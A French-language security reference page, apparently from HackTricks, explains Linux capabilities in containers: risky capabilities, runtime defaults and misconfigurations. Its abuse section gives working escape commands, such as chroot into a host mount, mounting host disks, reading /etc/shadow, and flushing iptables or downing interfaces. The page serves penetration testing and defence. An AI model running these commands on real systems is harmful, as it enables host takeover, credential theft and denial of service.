# Capacités Linux dans les conteneurs

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les capacités Linux sont l'un des éléments les plus importants de la sécurité des conteneurs, car elles répondent à une question subtile mais fondamentale : **que signifie réellement « root » à l'intérieur d'un conteneur ?** Sur un système Linux classique, l'UID 0 impliquait historiquement un ensemble très large de privilèges. Dans les noyaux modernes, ce privilège est décomposé en unités plus petites appelées capacités. Un processus peut s'exécuter en tant que root et cependant ne pas disposer de nombreuses opérations puissantes si les capacités pertinentes ont été retirées.

Les conteneurs dépendent fortement de cette distinction. Beaucoup de workloads sont encore lancés avec l'UID 0 à l'intérieur du conteneur pour des raisons de compatibilité ou de simplicité. Sans la suppression des capabilities, cela serait beaucoup trop dangereux. Avec la suppression des capabilities, un processus root containerisé peut toujours effectuer de nombreuses tâches ordinaires à l'intérieur du conteneur tout en se voyant refuser les opérations noyau plus sensibles. C'est pourquoi un shell de conteneur qui affiche `uid=0(root)` ne signifie pas automatiquement « root de l'hôte » ni même « privilège noyau étendu ». Les jeux de capabilities décident de la valeur réelle de cette identité root.

Pour la référence complète des capabilities Linux et de nombreux exemples d'abus, voir :

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Fonctionnement

Les capabilities sont suivies dans plusieurs ensembles, notamment les ensembles permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de conteneurs, la sémantique exacte du noyau pour chaque ensemble est moins immédiatement importante que la question pratique finale : **quelles opérations privilégiées ce processus peut-il réaliser maintenant, et quels gains de privilèges futurs sont encore possibles ?**

La raison pour laquelle cela compte est que de nombreuses techniques de breakout sont en réalité des problèmes de capabilities déguisés en problèmes de conteneurs. Un workload disposant de `CAP_SYS_ADMIN` peut accéder à une énorme partie des fonctionnalités du noyau qu'un processus root de conteneur normal ne devrait pas toucher. Un workload avec `CAP_NET_ADMIN` devient beaucoup plus dangereux s'il partage aussi le namespace réseau de l'hôte. Un workload avec `CAP_SYS_PTRACE` devient beaucoup plus intéressant s'il peut voir les processus de l'hôte via le partage PID de l'hôte. Dans Docker ou Podman cela peut apparaître comme `--pid=host` ; dans Kubernetes cela apparaît généralement comme `hostPID: true`.

En d'autres termes, le jeu de capabilities ne peut pas être évalué isolément. Il doit être lu conjointement avec les namespaces, seccomp et la politique MAC.

## Laboratoire

Une façon très directe d'inspecter les capabilities à l'intérieur d'un conteneur est :
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Vous pouvez également comparer un conteneur plus restrictif avec un autre auquel toutes les capabilities ont été ajoutées :
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Pour voir l'effet d'un ajout restreint, essayez de tout supprimer puis de ne réajouter qu'une seule capability :
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ces petites expériences montrent qu'un runtime ne se contente pas de basculer un booléen appelé "privileged". Il façonne la surface de privilèges réellement disponible pour le processus.

## Capacités à haut risque

Bien que de nombreuses capacités puissent être pertinentes selon la cible, quelques-unes reviennent fréquemment dans l'analyse des container escape.

**`CAP_SYS_ADMIN`** est celle que les défenseurs devraient considérer avec le plus de méfiance. On la décrit souvent comme "the new root" car elle débloque une énorme quantité de fonctionnalités, notamment des opérations liées au montage, des comportements sensibles aux namespaces, et de nombreux chemins du noyau qui ne devraient jamais être exposés aux conteneurs de manière légère. Si un conteneur a `CAP_SYS_ADMIN`, un seccomp laxiste et aucune confinement MAC solide, de nombreux breakout paths classiques deviennent beaucoup plus réalistes.

**`CAP_SYS_PTRACE`** est pertinente quand il existe une visibilité sur les processus, surtout si le namespace PID est partagé avec l'hôte ou avec des workloads voisins intéressants. Elle peut transformer la visibilité en manipulation.

**`CAP_NET_ADMIN`** et **`CAP_NET_RAW`** importent dans des environnements axés réseau. Sur un réseau en bridge isolé elles peuvent déjà être risquées ; sur un namespace réseau partagé avec l'hôte elles sont bien pires car la charge de travail peut être capable de reconfigurer le réseau de l'hôte, de sniff, de spoof, ou d'interférer avec les flux de trafic locaux.

**`CAP_SYS_MODULE`** est généralement catastrophique dans un environnement avec accès root car le chargement de modules du noyau équivaut à un contrôle du noyau hôte. Elle ne devrait presque jamais apparaître dans une charge de travail de conteneur à usage général.

## Utilisation au runtime

Docker, Podman, containerd-based stacks, et CRI-O utilisent tous des contrôles de capacités, mais les valeurs par défaut et les interfaces de gestion diffèrent. Docker les expose très directement via des flags tels que `--cap-drop` et `--cap-add`. Podman expose des contrôles similaires et bénéficie fréquemment de l'exécution sans root comme couche de sécurité supplémentaire. Kubernetes expose les ajouts et suppressions de capacités via le `securityContext` du Pod ou du conteneur. Les environnements de system-container tels que LXC/Incus s'appuient également sur le contrôle des capacités, mais l'intégration plus large avec l'hôte de ces systèmes pousse souvent les opérateurs à assouplir les valeurs par défaut plus agressivement qu'ils ne le feraient dans un environnement app-container.

Le même principe s'applique partout : une capacité qu'il est techniquement possible d'octroyer n'est pas nécessairement une capacité qui devrait être octroyée. De nombreux incidents réels commencent lorsqu'un opérateur ajoute une capacité simplement parce qu'une charge de travail échouait avec une configuration plus stricte et que l'équipe avait besoin d'un correctif rapide.

## Mauvaises configurations

L'erreur la plus évidente est **`--cap-add=ALL`** dans les CLI de style Docker/Podman, mais ce n'est pas la seule. En pratique, un problème plus courant est d'accorder une ou deux capacités extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour "faire fonctionner l'application" sans comprendre également les implications sur les namespaces, seccomp et les mounts. Un autre mode d'échec fréquent est de combiner des capacités supplémentaires avec le partage de namespaces hôte. Dans Docker ou Podman cela peut apparaître comme `--pid=host`, `--network=host`, ou `--userns=host` ; dans Kubernetes l'exposition équivalente apparaît généralement via des paramètres de workload tels que `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons change ce que la capacité peut réellement affecter.

Il est aussi courant de voir des administrateurs penser que parce qu'une charge de travail n'est pas entièrement `--privileged`, elle est néanmoins significativement contrainte. Parfois c'est vrai, mais parfois la posture effective est déjà suffisamment proche de privileged pour que la distinction cesse d'avoir une importance opérationnelle.

## Abus

La première étape pratique est d'énumérer l'ensemble effectif des capacités et de tester immédiatement les actions spécifiques aux capacités qui importeraient pour escape ou pour l'accès aux informations de l'hôte :
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` est présent, commencez par tester les abus basés sur mount et l'accès au système de fichiers de l'hôte, car c'est l'un des breakout enablers les plus courants :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` est présent et que le container peut voir des processus intéressants, vérifiez si la capability peut être transformée en inspection de processus :
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` ou `CAP_NET_RAW` est présent, testez si la charge de travail peut manipuler la pile réseau visible ou au moins collecter des renseignements réseau utiles :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quand un test de capability réussit, combinez-le avec la situation des namespaces. Une capability qui semble simplement risquée dans un namespace isolé peut devenir immédiatement un escape ou un host-recon primitive lorsque le container partage aussi host PID, host network ou host mounts.

### Exemple complet : `CAP_SYS_ADMIN` + Host Mount = Host Escape

Si le container a `CAP_SYS_ADMIN` et un bind mount en écriture du host filesystem comme `/host`, le chemin d'escape est souvent direct :
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` réussit, les commandes s'exécutent désormais dans le contexte du système de fichiers racine de l'hôte:
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` est indisponible, le même résultat peut souvent être obtenu en appelant le binary via l'arborescence montée :
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemple complet : `CAP_SYS_ADMIN` + accès au périphérique

Si un périphérique de bloc de l'hôte est exposé, `CAP_SYS_ADMIN` peut le transformer en accès direct au système de fichiers de l'hôte :
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Exemple complet: `CAP_NET_ADMIN` + Host Networking

Cette combinaison ne produit pas toujours directement host root, mais elle peut reconfigurer complètement le host network stack:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Cela peut permettre un déni de service, l'interception du trafic ou l'accès à des services qui étaient auparavant filtrés.

## Vérifications

L'objectif des vérifications des capabilities n'est pas seulement d'extraire des valeurs brutes, mais de comprendre si le processus dispose de suffisamment de privilèges pour rendre dangereuse sa situation actuelle de namespace et de mount.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Ce qui est intéressant ici :

- `capsh --print` est le moyen le plus simple pour repérer des capacités à haut risque comme `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ou `cap_sys_module`.
- La ligne `CapEff` dans `/proc/self/status` indique ce qui est effectivement actif maintenant, pas seulement ce qui pourrait être disponible dans d'autres ensembles.
- Un dump des capacités devient beaucoup plus important si le container partage aussi les PID, network, ou user namespaces de l'hôte, ou a des montages hôtes en écriture.

Après avoir collecté les informations brutes sur les capacités, l'étape suivante est l'interprétation. Se demander si le process est root, si les user namespaces sont actifs, si les host namespaces sont partagés, si seccomp est en mode enforcing, et si AppArmor ou SELinux restreignent encore le process. Un ensemble de capacités pris isolément n'est qu'une partie de l'histoire, mais c'est souvent la partie qui explique pourquoi une breakout de container fonctionne et qu'une autre échoue en partant du même point apparent.

## Runtime Defaults

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Ensemble de capacités réduit par défaut | Docker conserve une allowlist de capacités par défaut et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Ensemble de capacités réduit par défaut | Les conteneurs Podman sont non-privilégiés par défaut et utilisent un modèle de capacités réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hérite des paramètres du runtime sauf modification | Si aucun `securityContext.capabilities` n'est spécifié, le conteneur reçoit l'ensemble de capacités par défaut du runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Généralement le défaut du runtime | L'ensemble effectif dépend du runtime plus du Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Pour Kubernetes, le point important est que l'API ne définit pas un ensemble de capacités par défaut universel. Si le Pod n'ajoute ni ne supprime de capacités, la charge hérite du défaut du runtime pour ce nœud.
{{#include ../../../../banners/hacktricks-training.md}}
